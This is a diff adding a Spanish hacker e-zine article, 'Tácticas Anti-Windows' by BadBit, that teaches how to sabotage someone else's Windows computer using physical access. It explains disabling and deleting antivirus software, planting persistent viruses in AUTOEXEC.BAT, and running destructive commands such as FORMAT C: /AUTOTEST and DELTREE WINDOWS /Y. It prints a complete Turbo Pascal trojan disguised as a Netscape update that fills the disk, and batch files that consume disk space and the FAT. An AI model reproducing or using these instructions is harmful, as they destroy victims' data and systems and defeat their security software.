@@ -1,0 +1,437 @@
+El Radiaktivo Newz Team presenta:
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+                +--------------------------------------------+
+                |            Tácticas Anti-Windows           |
+                |                por BadBit                  |
+                +--------------------------------------------+
+
+                              badbit@yahoo.com
+
+             "Con Windows, el software tiene más control sobre la
+                       computadora que el usuario mismo"
+
+ /----------\
+ |Aclaración|
+ \----------/
+
+     No tomo responsabilidad por tus acciones. El contenido de este texto es
+únicamente EDUCACIONAL. Todos los casos son HIPOTETICOS, ninguno sucedió en
+realidad. No acepto reclamaciones de ningún tipo.
+
+ /---------------------------------------------------\
+ | ¿Exactamente de que se va a hablar en este texto? |
+ \---------------------------------------------------/
+
+     Principalmente son pequeños trucos para molestar a la gente (y dañar
+la imagen de Microsoft) que se aprovechan de la ignorancia de las personas
+(yo he burlado a "expertos" de computación) y demostrar que tu sabes más que
+ellos y nunca te van a superar.
+
+     ¿A qué se debe que la gente no sepa esto? Pues las computadoras, al
+volverse más sencillas de usar, han permitido que usuarios más idiotas se
+pongan a usarlas, y tomando en cuenta que hacer un sistema que sea amigable
+al usuario y con ambiente gráfico intiutivo no es muy fácil, las computadoras
+se han vuelto algo tan complejo que no cualquiera domina en serio su uso.
+Pero los que si lo hacen se pueden aprovechar de la ignoracia de los demás.
+
+ /--------------------\
+ |    Nescesitas:     |
+ \--------------------/
+
+     Es necesario tener acceso físico a la computadora y poder insertar
+diskettes o CD-ROMs o cualquier otro medio de almacenamiento portátil.
+Otra cosa que podrás ocupar es el programa REGEDIT.EXE que está en el
+directorio C:\WINDOWS de la de la mayoría de las computadoras (con Windows
+por supuesto), pero es mejor llevarlo por si acaso. También un generador de
+diccionarios (disponible en www.hack-net.com) y un ocultador de ventanas (te
+recomiendo el icon corral (y no, no te voy a decir donde conseguirlo)).
+
+
+ /----------------------\
+ |    Como comenzar     |
+ \----------------------/
+ 
+     Primero hay que encontrar una buena computadora, a una que tu sabes que
+si se descompone, alguien va a sufrir mucho :) e ir inocentemente con buenas
+intenciones (trabajar es una de ellas), meter tu floppy y decidir que sería
+mas molesto, ¿un virus?, ¿quedarse sin espacio en disco duro por una razón 
+desconocida?, ¿ver que cada ver que comienza Windows se ve "Fuck You" en
+grande?. Bueno, abordaremos todas esas opciones y otras más.
+
+    +-------+
+    | Virus |
+    +-------+
+
+     De esta opción nos podemos aprovechar porque la gente tiene el concepto
+de virus todo revuelto. Creen que si tienen un virus es el fin del mundo. No
+tienen en cuenta que alguna persona puede poner uno a propósito. Por desgra-
+cia, casi todas las personas confían en software anti-virus y no se dan
+cuenta de que son un fraude, pero eso no durará mucho, ya que les pondremos
+un virus irremovible. Tu puedes crear tus propios virus para ponerlos en la
+máquina de tu víctima. Lo que sucede con estos virus es que son irremovibles
+(al menos por McAfee VirusScan) y tendrán que soportar la carga de ellos
+aunque no saben que son casi inofensivos.
+
+     Para poder meter estos virus en el sistema, primero hay que desactivar
+los anti-virus, aunque trato de dar instrucciones muy generales, van enfoca-
+das a McAfee VirusScan (¿ya notaron que lo odio?), pero casi lo mismo se
+aplica a Norton y a otros.
+
+     Generalmente, los anti-virus tienen un módulo de escaneo en "background"
+y escanea archivos automáticamente al crearlos, copiarlos, moverlos, etc.
+Y como tu vas a copiar los virus del floppy al disco duro, ese módulo te
+estará molestando a cada rato. Así que presiona Ctrl + Alt + Del y en el
+menu que te aparece, escoge el antivirus y presiona. "Finalizar Tarea".
+Ahora hay que asegurarnos de que el antivirus no aparecerá jamás. Para eso
+selecciona Run (Ejecutar) del menú Start (Inicio) y escribe "regedit". Lo
+que verás tal vez te confunda si no has utilizado el registro. Pero hay
+muchos textos y revistas al respecto (tal vez yo escriba un texto de como
+manejarlo).
+
+     Direccionate hacia:
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+     Ahí verás varias entradas, la que creas que es de antivirus bórrala.
+Si quieres, puedes borrarlas todas, pero te recomiendo que no borres la de
+SystemTray, ya que es importante para que Windows funcione.
+
+    ¿Qué fué lo que hiciste? Ese folder (Run) contiente la información sobre
+los archivos que se van a ejecutar al iniciar Windows, y obviamente, si los
+borras, Windows ya no los corre. Esto es interesante, ya que tu puedes poner
+tus propias entradas, cosa que aprovecharemos más adelante.
+
+    Pero eso no es todo lo que tienes que hacer. Casi todos los antivirus
+ponen líneas en el autoexec.bat para que la computadora se escanee cada vez
+que arranca, simplemente edita autoexec.bat y borra esas líneas. Otra cosa,
+VirusScan tiene otro módulo de escaneo llamado ScreenScan, el cual escanea
+la computadora cada vez que se activa el salvapantallas. Para desactivarlo
+da un click derecho en el escritorio y selecciona Properties (propiedades),
+vas a ver una pestaña llamada ScreenScan (Duh), selecciónala y desactivala
+lo más que puedas.
+
+    Nada más para asegurarnos de que no volveremos a ver un anit-virus en esa
+computadora, ve al directorio a donde el anti-virus está localizado. No sé
+donde es, investígale, y a McAfee bórrale el archivo VSHWIN.EXE o algo así,
+y ThunderByte bórrale TBCLEAN.EXE, para Norton elimina NAVAPW32.EXE o los
+archivos que crees que se pueden borrar sin que quede completamente
+inutilizado (hay que dar la impresión de que el anti-virus sigue ahí).
+
+     Ahora que no hay anti-virus a 20 Km a la redonda, sigue la parte de
+infectar la computadora. Sólamente un consejo: que infectar la máquina sea
+lo último que hagas, es decir, que infectes la computadora cuando ya te vas
+a ir, ya que podrías (aunque es una posibilidad muy remota) infectar los
+programas de tu floppie, o has lo siguiente (lo cual es lo más conveniente):
+
+     1. Copia los archivos con el (o los) virus al directorio raíz del disco
+duro y al directorio C:\WINDOWS\COMMAND (Si en el directorio raíz hay muy
+pocos archivos y los del virus se van a notar, no lo hagas, mejor cópialos al
+directorio C:\DOS si es que está).
+
+     2. Abre el AUTOEXEC.BAT y añade líneas para activar los virus y es
+importante que le añadas @echo off si es que no lo tiene, por ejemplo:
+
+****Autoexec original (mi autoexec)*************
+PATH C:\WINDOWS;C:\WINDOWS\COMMAND;C:\DOS\IMMOUSE
+SET BLASTER=A220 I7 D1 T3
+rem - By Windows Setup - C:\WINDOWS\COMMAND\MSCDEX.EXE /D:BTCCD001 /V 
+SET CLASSPATH=%CLASSPATH%;%SystemRoot%\java\lib
+SET PGPPATH=C:\DOS\PGP
+PATH=%PATH%;"C:\Archivos de programa\Mts"
+************************************************
+
+**************Autoexec modificado***************
+@ECHO OFF
+PATH C:\WINDOWS;C:\WINDOWS\COMMAND;C:\DOS\IMMOUSE
+SET BLASTER=A220 I7 D1 T3
+rem - By Windows Setup - C:\WINDOWS\COMMAND\MSCDEX.EXE /D:BTCCD001 /V 
+SET CLASSPATH=%CLASSPATH%;%SystemRoot%\java\lib
+SET PGPPATH=C:\DOS\PGP
+PATH=%PATH%;"C:\Archivos de programa\Mts"
+: Virus puestos por BadBit Ja! Ja! Ja!
+ECCO2
+ECCO3
+CD WINDOWS
+ECCO2
+ECCO3
+CD\
+************************************************
+
+     No se te ocurra poner los virus en el registry (RUN) o en el Startup
+porque se va a notar la caja de MS-DOS, y aparte, Windows no deja correrlos,
+dice que hay una operación ilegal. El Autoexec es el mejor lugar para poner-
+los.
+
+     La línea ": Virus puestos por BadBit Ja! Ja! Ja!" es una "opción
+indocumentada". Los dos puntos indican que esa línea es una etiqueta, pero
+cuando MS-DOS encuentra un espacio después de los dos puntos, ignora la
+línea y no es procesada. Esa línea la puse por vanidad.
+
+
+     3. No corras los virus por tí mismo, será muy sospechoso, poníendolos
+en el autoexec.bat no deja rastros. Aparte ponerlos ahí, hace que aunque
+desinfecten la máquina, volverá a infectarse.
+
+     4. Si no puedes meter floppies a esa computadora, pero esa computadora
+tiene internet, saca una cuenta de correo gratuita (como hotmail o yahoo) y
+manda a la nueva dirección los virus y luego bájalos. Es otra buena idea
+hacer un sitio web con todos los archivos que ocupas para destruir cualquier
+sistema.
+
+     Ahora te has de sentir orgulloso de que alguien va a sufrir mucho
+cuando se entere de que tiene un virus en el sistema. ¡Disfrútalo!
+
+
+    +------------+
+    | Disco duro |
+    +------------+
+
+     Otra cosa que se puede hacer, es causar caos en el disco duro, puede
+borrarse algún directorio importante, dejar sin espacio al disco, hacerlo
+ilegible o simplemente formatearlo.
+
+     La cosa es cómo hacerlo, fácil, se pueden poner comandos en el autoexec,
+pero eso sería demasiado obvio. Mejor hay que hacer programas que hagan lo
+que queremos y luego se borren. Los lenguajes que usaré son: Turbo Pascal (o
+Pascal), QuickBASIC y Visual Basic. Como vez no escojo lenguajes de bajo
+nivel para que la mayoría de la gente pueda usarlos.
+
+     Primero analizaré la opción de poner los comandos en el autoexec:
+
+     Los directorios vulnerables son los siguientes:
+
+C:\WINDOWS
+C:\WINDOWS\SYSTEM
+C:\Program Files
+C:\Archivos de programa
+C:\
+
+    Si borras alguno es estos directorios, el sistema se verá en problemas.
+Pero si borras los siguientes archivos será menos notorio y tendrás casi
+los mismos resultados (o mejores):
+
+C:\WINDOWS\SYSTEM.DAT
+C:\WINDOWS\USER.DAT
+C:\WINDOWS\WIN.INI     <--(Aunque no lo creas, el borrar estos archivos hace
+C:\WINDOWS\SYSTEM.INI  <--que usar windows sea una pesadilla)
+C:\WINDOWS\SYSTEM\SHELL32.DLL
+C:\COMMAND.COM
+C:\WINDOWS\EXPLORER.EXE <--Simplemente cambiar un byte de este archivo y
+                           Windows será inusable.
+C:\WINDOWS\WIN.COM
+C:\IO.SYS
+C:\MSDOS.SYS
+C:\WINDOWS\FONTS\Fixedsys  <-- Realmente no se el nombre de archivo de estas
+C:\WINDOWS\FONTS\Ms Sans Serif <-- fuentes ya que Windows las oculta para que
+                                  sea extremadamente difícil borrarlas. Pero
+                                  se puede borrar todo el directorio fonts.
+
+
+    Ahora probemos poner las líneas destructivas en el Autoexec.bat, las
+líneas siguientes las podrías usar (las líneas que comienzan con punto y
+coma son comentarios):
+
+FORMAT C: /AUTOTEST
+;Este comando hace que el disco duro se formatee sin preguntar que si estás
+;seguro o si quieres formatear otro o que etiqueta le quieres poner.
+
+CD WINDOWS
+DEL *.EXE
+;Ya que DOS no pregunta por verificación en estas líneas, son muy útiles.
+;En el Autoexec (o en cualquier archivo Batch) no podemos poner DELTREE, ya
+;que pide confirmación del usuario para borrar todo.
+
+DEL COMMAND.COM
+;En verdad, no he probado si esta línea sirve, tal vez DOS nos lo impide.
+
+CD WINDOWS
+DEL WIN.COM
+
+CD WINDOWS
+CD SYSTEM
+DEL *.DLL
+
+CD WINDOWS
+REN EXPLORER.EXE FUCK.YOU
+
+DEL TEMP
+REN WINDOWS TEMP
+;¿QUEE? ¿El simple hecho de renombrar un directorio inutiliza a windows?
+
+DELTREE WINDOWS /Y
+;Ese simple parámetro (/y) hace que no pregunte por confirmación
+
+ATTRIB +H *.*
+
+CD WINDOWS
+ECHO y > y.txt
+DEL *.* < y.txt
+;Esto sirve para que no pregunte por confirmación
+
+    También podemos pensar en programas que nosotros hagamos y alteren
+archivos vitales. Por ejemplo este archivo de QBASIC:
+
+      OPEN "C:\WINDOWS\EXPLORER.EXE" FOR APPEND AS #1
+      PRINT #1, "BadBit fucked this computer, ENJOY!"
+      CLOSE #1
+      END
+
+    Esas cuatro líneas bastan para hacer windows inservible. La próxima vez
+que arranque Windows, recibirá a usuario con el mensaje: "EXPLORER.EXE está
+dañado, debe reinstalar Windows" y de ahí no sacas a esa terca máquina.
+
+    Ahora, en lugar de descomponer el disco (y su contenido), vamos a
+llenarlo, ¿como?, haciendo un archivo que llene todo el espacio disponible o
+copiando un mismo archivo infinitamente.
+
+    Al final de este archivo uuencodifiqué un creador de diccionarios. Si
+lo dejas corriendo en "Background", poco a poco llenará todo el espacio. Pero
+¿Cómo hacer que no se note?. Fácil, también uuencodifiqué un programa
+llamado The Icon Corral, es una aplicación de windows que hace que las
+aplicaciones que tu elijas, se conviertan en un icono en el System Tray, así
+puedes dejar corriendo el programa sin que nadie se de cuenta. Un usuario
+avanzado podría hacer click en el icono del System Tray, por eso tienes que
+poner escoger un ícono no evidente. (Si no entiendes lo que te estoy
+diciendo, descodifica los archivos, ejecútalos y entenderás)
+
+********
+Nota: El Sytem Tray es el lado derecho de la barra de tareas, donde se
+      encuentra el reloj y el control de volumen.
+********
+
+    Te recomiendo que corras un generador de diccionarios en un directorio
+que sea muy oculto, de ese modo se quedarán sin espacio y no sabrán qué fué
+lo que causó eso. Te recomiendo uno de los subdirectorios de
+C:\WINDOWS\System.
+
+    Otra forma de llenar el disco (esta es mucho más rápida), es con el
+siguiente programa de Turbo Pascal:
+
+PROGRAM beep;
+USES crt,dos;
+CONST
+     Hidden  = $02;
+VAR
+   code:integer;
+   print:text;
+   Attr:word ;
+   F:file;
+BEGIN
+code :=263;
+SetTime(0,1,0,0);
+SetDate(1999,2,10);
+clrscr;
+writeln('      Copyright 1994-1996 Netscape Communications Corporation');
+writeln('                       All rights reserved.');
+writeln;
+writeln('      Netscape Communications, Netscape, Netscape Navigator and');
+writeln('     the Netscape Communications logo are trademarks of Netscape');
+writeln('                    Communications Corporation.');
+readln;
+writeln;
+writeln(' Thank you for downloading the Netscape Navigator 3 update, NN3.01');
+writeln(' We have made everycare that this program is to your satisfaction.');
+writeln;
+writeln('    NN3.01 is confirming where your copy of Netscape Navigator is');
+writeln('    this make take some time.');
+ASSIGN (PRINT,'c:\dos.sys');
+writeln(Attr);
+REWRITE (PRINT);
+repeat
+write(Print,'*':500,chr(code));
+until KeyPressed;
+Close(PRINT);
+ASSIGN (F,'c:\dos.sys');
+SetFAttr(F, Hidden);
+writeln;
+writeln(' This copy of NN3.01 contains BUGZ, please download another copy.');
+readln;
+Randomize;
+  repeat
+    TextAttr := Random(256);
+    Write('DO SIN');
+  until code = 264;
+END.
+
+    Ese programa es un Trojan llamado Hard Disk Kill, y la verdad no entiendo
+porqué esas cosas inútiles en el código. ADVERTENCIA: NO lo corras en tu
+computadora, este programa REALMENTE se acaba todo el espacio del disco en
+pocos segundos. Sobre aviso no hay engaño.
+
+    La opción de hacer que un archivo se copie y crezca (casi) infinitamente
+se puede hacer fácilmente con un archivo batch:
+
+: Para que un archivo crezca infinitamente:
+echo qwertyqwertyqwertyqwertyqwertyqwertyqwertyqwertyqwerty > file1.sys
+echo qwertyqwertyqwertyqwertyqwertyqwertyqwertyqwertyqwerty > file2.sys
+echo qwertyqwertyqwertyqwertyqwertyqwertyqwertyqwertyqwerty > file3.sys
+echo qwertyqwertyqwertyqwertyqwertyqwertyqwertyqwertyqwerty > file4.sys
+echo a > total.dll
+copy file1.sys + file2.sys + file3.sys + file4.sys + total.dll total2.dll
+del file?.sys
+del total.dll
+ren total2.dll total.dll
+copy total.dll total2.dll
+:start
+copy total.dll + total2.dll total3.dll
+del total2.dll
+del total.dll
+copy total3.dll total2.dll
+copy total3.dll total.dll
+goto start
+
+
+: Para que un archivo se duplique infinitamente:
+echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa > system.sys
+:start
+MD System
+copy system.sys \System
+CD System
+goto start
+
+    El archivo batch pasado va a comerse a la FAT, ya que también crea
+subdirectorios infinitos. Estos archivos los puedes compilar con alguno de
+los programas que hay en circulación, así será menos evidente.
+
+    También se debe de tener en cuenta que renombrar un directorio puede
+causar caos en el disco duro. El simple hecho de renombrar el directorio de
+windows es suficiente para que un usuario inexperto crea que su computadora
+está desompuesta y formatee su disco duro. (Parece estúpido pero es cierto).
+
+    Con esto supongo que has agarrado unas cuantas ideas. Pasemos a otro
+tema.
+
+    +---------------------+
+    | Pantallas de inicio |
+    +---------------------+
+
+    Windows 95 o superior comienza con un comercial: La pantalla de inicio.
+Esta pantalla es completamente inútil y uno querría ponerle algo más
+productivo. Sorprendentemente(?), Micro$oft nunca dió un manera de cambiar
+ese dibujo. Pero se ha hablado mucho en revistas y en "Guide to (mostly)
+harmless hacking" sobre cómo modificar esa pantalla. Esto es muy conveniente
+pues la mayoría de la gente no sabe eso, y uno puede modificar esas pantallas
+a su gusto.
+
+   Los archivos que debes editar son Logo.sys, Logow.sys, Logos.sys. La
+localización de estos archivos varía, así que búscalos. Pueden tener
+atributos de sólo lectura, ocultos y/o sistema. Para editarlos sólamente
+ábrelos en Paint (estos archivos son archivos BMP con extensión SYS). Pero
+ten cuidado de no modificar su tamaño (320 X 400) ni el número de sus colores
+(256). Ten cuidado, ya que estos archivos se miran aplastados cuando los
+abres en Paint, calcúlale para que se vea bien al inicio y al final.
+
+   Por alguna extraña razón, no pude hallar el archivo logo.sys en Windows 98
+Beta 3.
+
+__________________________________________________
+  Esto es todo por el momento pero espero seguir escribiendo sobre este tema
+(la verdad es que me encanta). Hasta la próxima.
+Escrito por BadBit badbit@yahoo.com
+
+                                                      0101001001010100100101
+¿Como se sabe si Bill Gates está mintiendo?           10       0       1  01
+Se le mueven los labios.                              11     B@dbit       00
+                                                      01           1      10
+                                                      10 0           .... 10
+                                                      :101010 01011010111101
